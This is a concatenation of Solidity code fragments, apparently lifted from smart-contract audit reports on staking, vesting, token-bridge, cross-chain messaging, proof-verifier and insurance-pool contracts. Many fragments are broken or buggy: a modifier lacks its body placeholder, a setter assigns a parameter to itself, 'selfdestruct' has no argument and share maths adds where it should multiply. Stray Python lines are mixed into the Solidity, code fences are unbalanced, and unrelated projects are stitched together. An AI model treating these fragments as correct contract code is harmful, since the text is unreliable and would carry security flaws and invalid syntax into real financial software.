```\nfunction setOperatorFee(uint256 _operatorFee) external onlyAdmin {\n    if (_operatorFee > StakingContractStorageLib.getOperatorCommissionLimit()) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setOperatorFee(_operatorFee);\n    emit ChangedOperatorFee(_operatorFee);\n}\n```\n```\nfunction setGlobalFee(uint256 _globalFee) external onlyAdmin {\n    if (_globalFee > StakingContractStorageLib.getGlobalCommissionLimit()) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setGlobalFee(_globalFee);\n    emit ChangedGlobalFee(_globalFee);\n}\n```
"```\nfunction initialize_1(\n    address _admin,\n    address _treasury,\n    address _depositContract,\n    address _elDispatcher,\n    address _clDispatcher,\n    address _feeRecipientImplementation,\n    uint256 _globalFee,\n    uint256 _operatorFee,\n    uint256 globalCommissionLimitBPS,\n    uint256 operatorCommissionLimitBPS\n) external init(1) {\n```\n```\nfunction init(address _dispatcher, bytes32 _publicKeyRoot) external {\n    if (initialized) {\n        revert AlreadyInitialized();\n    }\n    initialized = true;\n    dispatcher = IFeeDispatcher(_dispatcher);\n    publicKeyRoot = _publicKeyRoot;\n    stakingContract = msg.sender; // The staking contract always calls init\n}\n```\n```\nfunction init(address _dispatcher, bytes32 _publicKeyRoot) external {\n    if (initialized) {\n        revert AlreadyInitialized();\n    }\n    initialized = true;\n    dispatcher = IFeeDispatcher(_dispatcher);\n    publicKeyRoot = _publicKeyRoot;\n}\n```"
"```\nif (operatorFee > 0) {\n    (status, data) = operator.call({\n        value: operatorFee\n    }(""""));\n    if (status == false) {\n        revert FeeRecipientReceiveError(data);\n    }\n}\n```"
```\nconstructor(uint256 _version) {\n    VERSION_SLOT.setUint256(_version);\n}\n```\n```\nconstructor(uint256 _version) {\n    VERSION_SLOT.setUint256(_version);\n}\n\nfunction initELD(address _stakingContract) external init(1) {\n    STAKING_CONTRACT_ADDRESS_SLOT.setAddress(_stakingContract);\n}\n```
```\nmodifier onlyActiveOperator(uint256 _operatorIndex) {\n    _onlyActiveOperator(_operatorIndex);\n}\n```
"```\nif (_globalFee > BASIS_POINTS) {\n    revert InvalidFee();\n}\nStakingContractStorageLib.setGlobalFee(_globalFee);\n\nif (_operatorFee > BASIS_POINTS) {\n    revert InvalidFee();\n}\nStakingContractStorageLib.setOperatorFee(_operatorFee);\n```\n```\nfunction initialize_2(uint256 globalCommissionLimitBPS, uint256 operatorCommissionLimitBPS) public init(2) {\n    if (globalCommissionLimitBPS > BASIS_POINTS) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setGlobalCommissionLimit(globalCommissionLimitBPS);\n\n    if (operatorCommissionLimitBPS > BASIS_POINTS) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setOperatorCommissionLimit(operatorCommissionLimitBPS);\n}\n```\n```\nfunction setGlobalFee(uint256 _globalFee) external onlyAdmin {\n    if (_globalFee > StakingContractStorageLib.getGlobalCommissionLimit()) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setGlobalFee(_globalFee);\n    emit ChangedGlobalFee(_globalFee);\n}\n```\n```\nfunction setOperatorFee(uint256 _operatorFee) external onlyAdmin {\n    if (_operatorFee > StakingContractStorageLib.getOperatorCommissionLimit()) {\n        revert InvalidFee();\n    }\n    StakingContractStorageLib.setOperatorFee(_operatorFee);\n    emit ChangedOperatorFee(_operatorFee);\n}\n```"
"```\ncontract StakingContract {\n    using StakingContractStorageLib for bytes32;\n}\n```\n```\ninterface IStakingContractFeeDetails {\n    function getWithdrawerFromPublicKeyRoot(bytes32 _publicKeyRoot) external view returns (address);\n\n    function getTreasury() external view returns (address);\n\n    function getOperatorFeeRecipient(bytes32 pubKeyRoot) external view returns (address);\n\n    function getGlobalFee() external view returns (uint256);\n\n    function getOperatorFee() external view returns (uint256);\n\n    function getExitRequestedFromRoot(bytes32 _publicKeyRoot) external view returns (bool);\n\n    function getWithdrawnFromPublicKeyRoot(bytes32 _publicKeyRoot) external view returns (bool);\n\n    function toggleWithdrawnFromPublicKeyRoot(bytes32 _publicKeyRoot) external;\n}\n```\ninterface IFeeRecipient {\n    function init(address _dispatcher, bytes32 _publicKeyRoot) external;\n\n    function withdraw() external;\n}"
"```\nerror Forbidden();\nerror InvalidFee();\nerror Deactivated();\nerror NoOperators();\nerror InvalidCall();\nerror Unauthorized();\nerror DepositFailure();\nerror DepositsStopped();\nerror InvalidArgument();\nerror UnsortedIndexes();\nerror InvalidPublicKeys();\nerror InvalidSignatures();\nerror InvalidWithdrawer();\nerror InvalidZeroAddress();\nerror AlreadyInitialized();\nerror InvalidDepositValue();\nerror NotEnoughValidators();\nerror InvalidValidatorCount();\nerror DuplicateValidatorKey(bytes);\nerror FundedValidatorDeletionAttempt();\nerror OperatorLimitTooHigh(uint256 limit, uint256 keyCount);\nerror MaximumOperatorCountAlreadyReached();\nerror LastEditAfterSnapshot();\nerror PublicKeyNotInContract();\n```\nmodifier init(uint256 _version) {\n    if (_version!= VERSION_SLOT.getUint256() + 1) {\n        revert AlreadyInitialized();\n    }\n}\n```\nmodifier init(uint256 _version) {\n    if (_version!= VERSION_SLOT.getUint256() + 1) {\n        revert AlreadyInitialized();\n    }\n}\n```\nmodifier init(uint256 _version) {\n    if (_version!= StakingContractStorageLib.getVersion() + 1) {\n        revert AlreadyInitialized();\n    }\n}"
"```\nfunction setupVoting(uint256 planId) external nonReentrant returns (address votingVault) {\n    votingVault = _setupVoting(msg.sender, planId);\n}\n```\nfunction _setupVoting(address holder, uint256 planId) internal returns (address) {\n    require(ownerOf(planId) == holder, '!owner');\n}\n```\n```\nfunction segmentPlan(\n    uint256 planId,\n    uint256[] memory segmentAmounts\n) external nonReentrant returns (uint256[] memory newPlanIds) {\n    newPlanIds = new uint256[](segmentAmounts.length);\n    for (uint256 i; i < segmentAmounts.length; i++) {\n        uint256 newPlanId = _segmentPlan(msg.sender, planId, segmentAmounts[i]);\n```\n```\nfunction _segmentPlan(address holder, uint256 planId, uint256 segmentAmount) internal returns (uint256 newPlanId) {\n    require(ownerOf(planId) == holder, '!owner');\n```\n```\nfunction revokePlans(uint256[] memory planIds) external nonReentrant {\n    for (uint256 i = 0; i < planIds.length; i++) {\n        _revokePlan(msg.sender, planIds[i]);\n    }\n}\n```\nfunction _revokePlan(address vestingAdmin, uint256 planId) internal {\n    Plan memory plan = plans[planId];\n    require(vestingAdmin == plan.vestingAdmin, '!vestingAdmin');\n}"
"```\nfunction _revokePlan(address vestingAdmin, uint256 planId) internal {\n    Plan memory plan = plans[planId];\n    require(vestingAdmin == plan.vestingAdmin, '!vestingAdmin');\n    (uint256 balance, uint256 remainder,) = planBalanceOf(planId, block.timestamp, block.timestamp);\n    require(remainder > 0, '!Remainder');\n    address holder = ownerOf(planId);\n    delete plans[planId];\n    _burn(planId);\n    TransferHelper.withdrawTokens(plan.token, vestingAdmin, remainder);\n    TransferHelper.withdrawTokens(plan.token, holder, balance);\n    emit PlanRevoked(planId, balance, remainder);\n}\n```\n```\nfunction _revokePlan(address vestingAdmin, uint256 planId) internal {\n    Plan memory plan = plans[planId];\n    require(vestingAdmin == plan.vestingAdmin, '!vestingAdmin');\n\n    (uint256 balance, uint256 remainder,) = planBalanceOf(planId, block.timestamp, block.timestamp);\n    require(remainder > 0, '!Remainder');\n\n    address holder = ownerOf(planId);\n    delete plans[planId];\n    _burn(planId);\n\n    address vault = votingVaults[planId];\n    if (vault == address(0)) {\n        TransferHelper.withdrawTokens(plan.token, vestingAdmin, remainder);\n        TransferHelper.withdrawTokens(plan.token, holder, balance);\n    } else {\n        delete votingVaults[planId];\n        VotingVault(vault).withdrawTokens(vestingAdmin, remainder);\n        VotingVault(vault).withdrawTokens(holder, balance);\n    }\n\n    emit PlanRevoked(planId, balance, remainder);\n}\n```"
"```\nfunction withdrawTokens(address to, uint256 amount) external onlyController {\n    TransferHelper.withdrawTokens(token, to, amount);\n    if (IERC20(token).balanceOf(address(this)) == 0) {\n        selfdestruct;\n    }\n}\n```"
"```\nfunction transferTokens(\n    address token,\n    address from,\n    address to,\n    uint256 amount\n) internal {\n    uint256 priorBalance = IERC20(token).balanceOf(address(to));\n    require(IERC20(token).balanceOf(msg.sender) >= amount, 'THL01');\n```"
"```\nif (nativeMappingValue == NATIVE_STATUS) {\n    IERC20(_nativeToken).safeTransfer(_recipient, _amount);\n} else {\n    bridgedToken = nativeMappingValue;\n    if (nativeMappingValue == EMPTY) {\n        bridgedToken = deployBridgedToken(_nativeToken, _tokenMetadata);\n        bridgedToNativeToken[bridgedToken] = _nativeToken;\n        nativeToBridgedToken[_nativeToken] = bridgedToken;\n    }\n    BridgedToken(bridgedToken).mint(_recipient, _amount);\n}\n```\n```\nfunction setDeployed(address[] memory _nativeTokens) external onlyMessagingService fromRemoteTokenBridge {\n    address nativeToken;\n    for (uint256 i; i < _nativeTokens.length; i++) {\n        nativeToken = _nativeTokens[i];\n        nativeToBridgedToken[_nativeTokens[i]] = DEPLOYED_STATUS;\n        emit TokenDeployed(_nativeTokens[i]);\n    }\n}\n```"
"```\nfunction setCustomContract(\n    address _nativeToken,\n    address _targetContract\n) external onlyOwner isNewToken(_nativeToken) {\n    nativeToBridgedToken[_nativeToken] = _targetContract;\n    bridgedToNativeToken[_targetContract] = _nativeToken;\n    emit CustomContractSet(_nativeToken, _targetContract);\n}\n```"
"```\nmapping(address => address) public nativeToBridgedToken;\nmapping(address => address) public bridgedToNativeToken;\n```\nfunction completeBridging(\n    address _nativeToken,\n    uint256 _amount,\n    address _recipient,\n    bytes calldata _tokenMetadata\n) external onlyMessagingService fromRemoteTokenBridge {\n    address nativeMappingValue = nativeToBridgedToken[_nativeToken];\n    address bridgedToken;\n\n    if (nativeMappingValue == NATIVE_STATUS) {\n        IERC20(_nativeToken).safeTransfer(_recipient, _amount);\n    } else {\n```"
"```\nfunction initialize(\n    address _securityCouncil,\n    address _messageService,\n    address _tokenBeacon,\n    address[] calldata _reservedTokens\n) external initializer {\n    _Pausable_init();\n    _Ownable_init();\n    setMessageService(_messageService);\n    tokenBeacon = _tokenBeacon;\n    for (uint256 i = 0; i < _reservedTokens.length; i++) {\n        setReserved(_reservedTokens[i]);\n    }\n    _transferOwnership(_securityCouncil);\n}\n```"
"```\nfunction setCustomContract(\n    address _nativeToken,\n    address _targetContract\n) external onlyOwner isNewToken(_nativeToken) {\n    nativeToBridgedToken[_nativeToken] = _targetContract;\n    bridgedToNativeToken[_targetContract] = _nativeToken;\n    emit CustomContractSet(_nativeToken, _targetContract);\n}\n```"
"```\nfunction setCustomContract(\n    address _nativeToken,\n    address _targetContract\n) external onlyOwner isNewToken(_nativeToken) {\n    nativeToBridgedToken[_nativeToken] = _targetContract;\n    bridgedToNativeToken[_targetContract] = _nativeToken;\n    emit CustomContractSet(_nativeToken, _targetContract);\n}\n```\n```\n} else {\n    bridgedToken = nativeMappingValue\n    if (nativeMappingValue == EMPTY) {\n        bridgedToken = deployBridgedToken(_nativeToken, _tokenMetadata)\n        bridgedToNativeToken[bridgedToken] = _nativeToken\n        nativeToBridgedToken[_nativeToken] = bridgedToken\n    }\n    BridgedToken(bridgedToken).mint(_recipient, _amount)\n}"
```\nfunction setMessageService(address _messageService) public onlyOwner {\n    messageService = IMessageService(_messageService);\n}\n```
```\npragma solidity ^0.8.19;\n```\n```\npragma solidity ^0.8.19;\n```\n```\npragma solidity ^0.8.19;\n```\n```\npragma solidity ^0.8.19;\n```
"```\ncontract TokenBridge is\n    ITokenBridge,\n    PausableUpgradeable,\n    OwnableUpgradeable {\n```"
"```\nfunction finalizeBlocks(\n    BlockData[] calldata _blocksData,\n    bytes calldata _proof,\n    uint256 _proofType,\n    bytes32 _parentStateRootHash\n)"
"```\n(bool success, bytes memory returnData) = _to.call{ value: _value }(_calldata);\nif (!success) {\n    if (returnData.length > 0) {\n        assembly {\n            let data_size := mload(returnData)\n            revert(add(32, returnData), data_size)\n        }\n    } else {\n        revert MessageSendingFailed(_to);\n    }\n}\n```\n```\n(bool success, bytes memory returnData) = _to.call{ value: _value }(_calldata);\nif (!success) {\n    if (returnData.length > 0) {\n        assembly {\n            let data_size := mload(returnData)\n            revert(add(32, returnData), data_size)\n        }\n    } else {\n        revert MessageSendingFailed(_to);\n    }\n}\n```"
"```\nuint256 messageNumber = nextMessageNumber;\nuint256 valueSent = msg.value - _fee;\n\nbytes32 messageHash = keccak256(\n    abi.encode(\n        msg.sender,\n        _to,\n        _fee,\n        valueSent,\n        messageNumber,\n        _calldata\n    )\n);\n```\n(bool success, bytes memory returnData) = _to.call{ value: _value }(_calldata);\nif (!success) {\n    if (returnData.length > 0) {\n        assembly {\n            let data_size := mload(returnData)\n            revert(add(32, returnData), data_size)\n        }\n    } else {\n        revert MessageSendingFailed(_to);\n    }\n}\n```\n```\n(bool success, bytes memory returnData) = _to.call{ value: _value }(_calldata);\nif (!success) {\n    if (returnData.length > 0) {\n        assembly {\n            let data_size := mload(returnData)\n            revert(add(32, returnData), data_size)\n        }\n    } else {\n        revert MessageSendingFailed(_to);\n    }\n}\n```"
"```\nfunction finalizeBlocks(\n    BlockData[] calldata _blocksData,\n    bytes calldata _proof,\n    uint256 _proofType,\n    bytes32 _parentStateRootHash\n) external\n    whenTypeNotPaused(PROVING_SYSTEM_PAUSE_TYPE)\n    whenTypeNotPaused(GENERAL_PAUSE_TYPE)\n    onlyRole(OPERATOR_ROLE)\n{\n    if (stateRootHashes[currentL2BlockNumber]!= _parentStateRootHash) {\n        revert StartingRootHashDoesNotMatch();\n    }\n    _finalizeBlocks(_blocksData, _proof, _proofType, _parentStateRootHash, true);\n}\n```"
"```\nuint256 messageNumber = nextMessageNumber;\nuint256 valueSent = msg.value - _fee;\n\nbytes32 messageHash = keccak256(\n    abi.encode(\n        msg.sender,\n        _to,\n        _fee,\n        valueSent,\n        messageNumber,\n        _calldata\n    )\n);\n```\nfunction addL1L2MessageHashes(bytes32[] calldata _messageHashes) external onlyRole(L1_L2_MESSAGE_SETTER_ROLE) {\n    uint256 messageHashesLength = _messageHashes.length;\n\n    if (messageHashesLength > 100) {\n        revert MessageHashesListLengthHigherThanOneHundred(messageHashesLength);\n    }\n\n    for (uint256 i = 0; i < messageHashesLength; ) {\n        bytes32 messageHash = _messageHashes[i];\n        if (inboxL1L2MessageStatus[messageHash] == INBOX_STATUS_UNKNOWN) {\n            inboxL1L2MessageStatus[messageHash] = INBOX_STATUS_RECEIVED;\n        }\n        unchecked {\n            i++;\n        }\n    }\n\n    emit L1L2MessageHashesAddedToInbox(_messageHashes);\n}\n```"
"```\nfunction setVerifierAddress(address _newVerifierAddress, uint256 _proofType) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    if (_newVerifierAddress == address(0)) {\n        revert ZeroAddressNotAllowed();\n    }\n    verifiers[_proofType] = _newVerifierAddress;\n}\n```"
```\nif (blockInfo.l2BlockTimestamp >= block.timestamp) {\n    revert BlockTimestampError();\n}\n```
```\n_addUsedAmount(_fee + _value)\n```\n_addUsedAmount(msg.value)\n```\nfunction _addUsedAmount(uint256 _usedAmount) internal {\n    uint256 currentPeriodAmountTemp;\n\n    if (currentPeriodEnd < block.timestamp) {\n        // Update period before proceeding\n        currentPeriodEnd = block.timestamp + periodInSeconds;\n        currentPeriodAmountTemp = _usedAmount;\n    } else {\n        currentPeriodAmountTemp = currentPeriodAmountInWei + _usedAmount;\n    }\n\n    if (currentPeriodAmountTemp > limitInWei) {\n        revert RateLimitExceeded();\n    }\n\n    currentPeriodAmountInWei = currentPeriodAmountTemp;\n}\n```
"```\nif (_fee > 0) {\n    address feeReceiver = _feeRecipient == address(0)? msg.sender : _feeRecipient;\n    (bool feePaymentSuccess, ) = feeReceiver.call{ value: _fee }("""");\n    if (!feePaymentSuccess) {\n        revert FeePaymentFailed(feeReceiver);\n    }\n}\n```\n```\nif (_fee > 0) {\n    address feeReceiver = _feeRecipient == address(0)? msg.sender : _feeRecipient;\n    (bool feePaymentSuccess, ) = feeReceiver.call{ value: _fee }("""");\n    if (!feePaymentSuccess) {\n        revert FeePaymentFailed(feeReceiver);\n    }\n}\n```"
"```\nuint256[10] private _gap;\n```\n```\nuint256[10] private _gap;\n```\n```\nuint256[10] private __base_gap;\n```\n```\nuint256[50] private _gap_L2MessageService;\n```\n```\nfunction __RateLimiter_init(uint256 _periodInSeconds, uint256 _limitInWei) internal {\n```\n```\nfunction _init_MessageServiceBase(address _messageService, address _remoteSender) internal {\n```"
"```\nfunction _updateL1L2MessageStatusToReceived(bytes32[] memory _messageHashes) internal {\n    uint256 messageHashArrayLength = _messageHashes.length;\n\n    for (uint256 i = 0; i < messageHashArrayLength; ) {\n        bytes32 messageHash = _messageHashes[i];\n        uint256 existingStatus = outboxL1L2MessageStatus[messageHash];\n\n        if (existingStatus == INBOX_STATUS_UNKNOWN) {\n            revert L1L2MessageNotSent(messageHash);\n        }\n\n        if (existingStatus!= OUTBOX_STATUS_RECEIVED) {\n            outboxL1L2MessageStatus[messageHash] = OUTBOX_STATUS_RECEIVED;\n        }\n\n        unchecked {\n            i++;\n        }\n    }\n\n    emit L1L2MessagesReceivedOnL2(_messageHashes);\n}\n```\n```\nfunction addL1L2MessageHashes(bytes32[] calldata _messageHashes) external onlyRole(L1_L2_MESSAGE_SETTER_ROLE) {\n    uint256 messageHashesLength = _messageHashes.length;\n\n    if (messageHashesLength > 100) {\n        revert MessageHashesListLengthHigherThanOneHundred(messageHashesLength);\n    }\n\n    for (uint256 i = 0; i < messageHashesLength; ) {\n        bytes32 messageHash = _messageHashes[i];\n        if (inboxL1L2MessageStatus[messageHash] == INBOX_STATUS_UNKNOWN) {\n            inboxL1L2MessageStatus[messageHash] = INBOX_STATUS_RECEIVED;\n        }\n        unchecked {\n            i++;\n        }\n    }\n\n    emit L1L2MessageHashesAddedToInbox(_messageHashes);\n```\n```\nif (existingStatus == INBOX_STATUS_UNKNOWN):\n    revert L1L2MessageNotSent(messageHash)\n```\n```\ntimestampHashes[i] = blockInfo.l2BlockTimestamp\n```\n```\nclass dev:\n    def __init__(self):\n        pass\n\n    def Thrown(self):\n        raise error(""InvalidAction"")\n```"
"```\ndata = it._skipTo(8)._toBytes()\n```\n```\ndata = it._skipTo(7)._toBytes()\n```\n```\ndata = it._skipTo(6)._toBytes()\n```\n```\nfunction _skipTo(Iterator memory _self, uint256 _skipToNum) internal pure returns (RLPItem memory item) {\n    uint256 ptr = _self.nextPtr;\n    uint256 itemLength = _itemLength(ptr);\n    _self.nextPtr = ptr + itemLength;\n\n    for (uint256 i = 0; i < _skipToNum - 1; ) {\n        ptr = _self.nextPtr;\n        itemLength = _itemLength(ptr);\n        _self.nextPtr = ptr + itemLength;\n        unchecked {\n            i++;\n        }\n    }\n\n    item.len = itemLength;\n    item.memPtr = ptr;\n}\n```\n```\nCodecV2._extractXDomainAddHashes(\n    TransactionDecoder.decodeTransaction(_transactions[_batchReceptionIndices[i]])\n)"
```\nfunction _updateL2L1MessageStatusToClaimed(bytes32 _messageHash) internal {\n    if (inboxL2L1MessageStatus[_messageHash]!= INBOX_STATUS_RECEIVED) {\n        revert MessageAlreadyClaimed();\n    }\n\n    delete inboxL2L1MessageStatus[_messageHash];\n\n    emit L2L1MessageClaimed(_messageHash);\n}\n```\n```\nfunction _updateL1L2MessageStatusToClaimed(bytes32 _messageHash) internal {\n    if (inboxL1L2MessageStatus[_messageHash]!= INBOX_STATUS_RECEIVED) {\n        revert MessageAlreadyClaimed();\n    }\n\n    inboxL1L2MessageStatus[_messageHash] = INBOX_STATUS_CLAIMED;\n\n    emit L1L2MessageClaimed(_messageHash);\n}\n```
"```\nfunction pauseByType(bytes32 _pauseType) external onlyRole(PAUSE_MANAGER_ROLE) {\n    pauseTypeStatuses[_pauseType] = true;\n    emit Paused(_msgSender(), _pauseType);\n}\n```\n```\nfunction unPauseByType(bytes32 _pauseType) external onlyRole(PAUSE_MANAGER_ROLE) {\n    pauseTypeStatuses[_pauseType] = false;\n    emit UnPaused(_msgSender(), _pauseType);\n}\n```\n```\nfunction resetRateLimitAmount(uint256 _amount) external onlyRole(RATE_LIMIT_SETTER_ROLE) {\n    bool amountUsedLoweredToLimit;\n\n    if (_amount < currentPeriodAmountInWei) {\n        currentPeriodAmountInWei = _amount;\n        amountUsedLoweredToLimit = true;\n    }\n\n    limitInWei = _amount;\n\n    emit LimitAmountChange(_msgSender(), _amount, amountUsedLoweredToLimit);\n}\n```\n```\nfunction resetAmountUsedInPeriod() external onlyRole(RATE_LIMIT_SETTER_ROLE) {\n    currentPeriodAmountInWei = 0;\n\n    emit AmountUsedInPeriodReset(_msgSender());\n}\n```"
```\nuint256 constant g2_srs_0_x_0 = 11559732032986387107991004021392285783925812861821192530917403151452391805634;\nuint256 constant g2_srs_0_x_1 = 10857046999023057135944570762232829481370756359578518086990519993285655852781;\nuint256 constant g2_srs_0_y_0 = 4082367875863433681332203403145435568316851327593401208105741076214120093531;\nuint256 constant g2_srs_0_y_1 = 8495653923123431417604973247489272438418190587263600148770280649306958101930;\n\nuint256 constant g2_srs_1_x_0 = 18469474764091300207969441002824674761417641526767908873143851616926597782709;\nuint256 constant g2_srs_1_x_1 = 17691709543839494245591259280773972507311536864513996659348773884770927133474;\nuint256 constant g2_srs_1_y_0 = 2799122126101651639961126614695310298819570600001757598712033559848160757380;\nuint256 constant g2_srs_1_y_1 = 3054480525781015242495808388429905877188466478626784485318957932446534030175;\n```
"```\nlet l_success := staticcall(\n    sub(gas(), 2000),\n    8,\n    mPtr,\n    0x180,\n    0x00,\n    0x20\n)\nmstore(\n    add(state, state_success),\n    and(l_success, mload(add(state, state_success)))\n)"
"```\npop(\n    staticcall(\n        sub(\n            gas(),\n            2000\n        ),\n        0x2,\n        add(mPtr, 0x1b),\n        size,\n        mPtr,\n        0x20\n    )\n)\n```\npop(\n    staticcall(\n        sub(\n            gas(),\n            2000\n        ),\n        0x2,\n        add(mPtr, 0x1c),\n        0x24,\n        mPtr,\n        0x20\n    )\n)\n```\npop(\n    staticcall(\n        sub(\n            gas(),\n            2000\n        ),\n        0x2,\n        add(mPtr, 0x1b),\n        0x65,\n        mPtr,\n        0x20\n    )\n)\n```\npop(\n    staticcall(\n        sub(\n            gas(),\n            2000\n        ),\n        0x2,\n        add(mPtr, 0x1c),\n        0xe4,\n        mPtr,\n        0x20\n    )\n)\n```\npop(\n    staticcall(\n        sub(\n            gas(),\n            2000\n        ),\n        0x2,\n        add(mPtr, start_input),\n        size_input,\n        add(state, state_gamma_kzg),\n        0x20\n    )\n)\n```\npop(\n    staticcall(\n        sub(\n            gas(),\n            2000\n        ),\n        0x05,\n        mPtr,\n        0xc0,\n        0x00,\n        0x20\n    )\n)\n```\npop(\n    staticcall(\n        sub(\n            gas(),\n            2000\n        ),\n        0x05,\n        mPtr,\n        0xc0,\n        mPtr,\n        0x20\n    )\n)\n```\npop(\n    staticcall(\n        sub(\n            gas(),\n            2000\n        ),\n        0x05,\n        mPtr,\n        0xc0,\n        mPtr,\n        0x20\n    )\n)\n```\npop(\n    staticcall(\n        sub(\n            gas(),\n            2000\n        ),\n        7,\n        folded_evals_commit,\n        0x60,\n        folded_evals_commit,\n        0x40\n    )\n)\n```\nlet l_success := \n    staticcall(\n        sub(gas(), 2000),\n        6,\n        mPtr,\n        0x80,\n        dst,\n        0x40\n    )\n```\n```\nlet l_success := \n    staticcall(\n        sub(gas(), 2000),\n        7,\n        mPtr,\n        0x60,\n        dst,\n        0x40\n    )\n```\n```\nlet l_success := \n    staticcall(\n        sub(gas(), 2000),\n        7,\n        mPtr,\n        0x60,\n        mPtr,\n        0x40\n    )\n```\n```\nl_success := \n    and(\n        l_success, \n        staticcall(\n            sub(gas(), 2000), \n            6, \n            mPtr, \n            0x80, \n            dst, \n            0x40\n        )\n    )\n```"
"```\nfunction point_mul(dst, src, s, mPtr) {\n    let mPtr := add(mload(0x40), state_last_mem)\n    let state := mload(0x40)\n    mstore(mPtr, mload(src))\n    mstore(add(mPtr, 0x20), mload(add(src, 0x20)))\n    mstore(add(mPtr, 0x40), s)\n    let l_success := staticcall(sub(gas(), 2000), 7, mPtr, 0x60, dst, 0x40)\n    mstore(add(state, state_success), and(l_success, mload(add(state, state_success))))\n\nfunction point_acc_mul(dst, src, s, mPtr) {\n    let state := mload(0x40)\n    mstore(mPtr, mload(src))\n    mstore(add(mPtr, 0x20), mload(add(src, 0x20)))\n    mstore(add(mPtr, 0x40), s)\n    let l_success := staticcall(sub(gas(), 2000), 7, mPtr, 0x60, mPtr, 0x40)\n    mstore(add(mPtr, 0x40), mload(dst))\n    mstore(add(mPtr, 0x60), mload(add(dst, 0x20)))\n    l_success := and(l_success, staticcall(sub(gas(), 2000), 6, mPtr, 0x80, dst, 0x40))\n    mstore(add(state, state_success), and(l_success, mload(add(state, state_success))))\n}\n```"
"```\nfunction Verify(bytes memory proof, uint256[] memory publicInputs)\n```\n```\nfunction sum_pi_wo_api_commit(ins, n, z) {\n    let li := mload(0x40)\n    batch_compute_lagranges_at_z(z, n, li)\n    let res := 0\n    let tmp := 0\n    for (let i := 0; i < n; i := add(i, 1)) {\n        tmp := mulmod(mload(li), mload(ins), r_mod)\n        res := addmod(res, tmp, r_mod)\n        li := add(li, 0x20)\n        ins := add(ins, 0x20)\n    }\n    mstore(mload(0x40), res)\n}\n```"
"```\nuint256[] memory wireCommittedCommitments = new uint256[](2 * vk_nb_commitments_commit_api);\nload_wire_commitments_commit_api(wireCommittedCommitments, proof);\n```\n```\nfor (let i = 0; i < mul(vk_nb_commitments_commit_api, 2); i = add(i, 1)) {\n}\n```"
```\nall: clean\n    solc\n```
```\nrefundMap[policyIndex][week] = incomeMap[policyIndex][week].mul(\n    allCovered.sub(maximumToCover)).div(allCovered)\n```
"```\nfunction refund(\n    uint256 policyIndex_,\n    uint256 week_,\n    address who_\n) external nonReentrant {\n    Coverage storage coverage = coverageMap[policyIndex_][week_][who_];\n\n    require(!coverage.refunded, ""Already refunded"");\n\n    uint256 allCovered = coveredMap[policyIndex_][week_];\n    uint256 amountToRefund = refundMap[policyIndex_][week_].mul(coverage.amount).div(allCovered);\n    coverage.amount = coverage.amount.mul(coverage.premium.sub(amountToRefund)).div(coverage.premium);\n    coverage.refunded = true;\n\n    IERC20(baseToken).safeTransfer(who_, amountToRefund);\n\n    if (eventAggregator!= address(0)) {\n        IEventAggregator(eventAggregator).refund(\n            policyIndex_,\n            week_,\n            who_,\n            amountToRefund\n        );\n    }\n}\n```"
```\npoolInfo.accTidalPerShare = poolInfo.accTidalPerShare.add(\n    amount * SHARE_UNITS\n).div(poolInfo.totalShare);\n```\n```\npoolInfo.accTidalPerShare = poolInfo.accTidalPerShare.add(\n    amount * SHARE_UNITS).div(poolInfo.totalShare)\n```\n```\npoolInfo.accTidalPerShare += amount * SHARE_UNITS / poolInfo.totalShare;\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare.add(userInfo.share).div(SHARE_UNITS);\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare.mul(userInfo.share).div(SHARE_UNITS);\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare * userInfo.share / SHARE_UNITS;\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare.add(userInfo.share);\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare.mul(userInfo.share).div(SHARE_UNITS);\n```\n```\nuint256 accAmount = poolInfo.accTidalPerShare * userInfo.share / SHARE_UNITS;\n```
"```\nfunction claim(\n    uint256 policyIndex_,\n    uint256 amount_,\n    address recipient_\n) external onlyPoolManager {\n```"
"```\nfor (uint256 w = fromWeek_; w < toWeek_; ++w) {\n    incomeMap[policyIndex_][w] = incomeMap[policyIndex_][w].add(premium);\n    coveredMap[policyIndex_][w] = coveredMap[policyIndex_][w].add(amount_);\n    \n    require(coveredMap[policyIndex_][w] <= maximumToCover, ""Not enough to buy"");\n    coverageMap[policyIndex_][w][_msgSender()] = Coverage({\n        amount: amount_,\n        premium: premium,\n        refunded: false\n    });\n}\n```"
"```\nEvery Pool is a standalone smart contract. It is made upgradeable with OpenZeppelin's Proxy Upgrade Pattern.\n```\nAnd there will be multiple proxies and one implementation of the Pools, \nand one proxy and one implementation of EventAggregator.\n```"
```\nfor (uint256 i = 0; i < committeeMembers.length; ++i) {\n    address member = committeeMembers[i];\n    committeeArray.push(member);\n    committeeIndexPlusOne[member] = committeeArray.length;\n}\n```
```\nuint256 premium = amount_.mul(policy.weeklyPremium).div(RATIO_BASE);\nuint256 allPremium = premium.mul(toWeek_.sub(fromWeek_));\n```
```\nfunction _executeRemoveFromCommittee(address who_) private {\n```\n```\nfunction _executeChangeCommitteeThreshold(uint256 threshold_) private {\n```
"```\nuint256 constant AMOUNT_PER_SHARE = 1e18;\n```\n```\nfunction deposit(\n    uint256 amount_\n) external nonReentrant {\n    require(enabled, ""Not enabled"");\n    require(amount_ >= AMOUNT_PER_SHARE / 1000000, ""Less than minimum"");\n}\n```"
```\npragma solidity ^0.8.10;\n```\n```\npragma solidity ^0.8.10;\n```
```\ndef onlyTest():\n```\n```\nfunction setTimeExtra(uint256 timeExtra_) external onlyTest {\n```\n```\nfunction getCurrentWeek() public view returns(uint256) {\n    return (block.timestamp + TIME_OFFSET + timeExtra) / (7 * days);\n}\n```\n```\nfunction getNow() public view returns (uint256) {\n    return block.timestamp + timeExtra;\n}\n```
```\nfunction setEventAggregator(address eventAggregator_) external onlyPoolManager {\n    eventAggregator = eventAggregator_;\n}\n```\n```\nfunction enablePool(bool enabled_) external onlyPoolManager {\n    enabled_ = enabled_;\n}\n```\n```\nif (eventAggregator!= address(0)) {\n    IEventAggregator(eventAggregator).execute(\n        requestIndex_\n    );\n}\n```
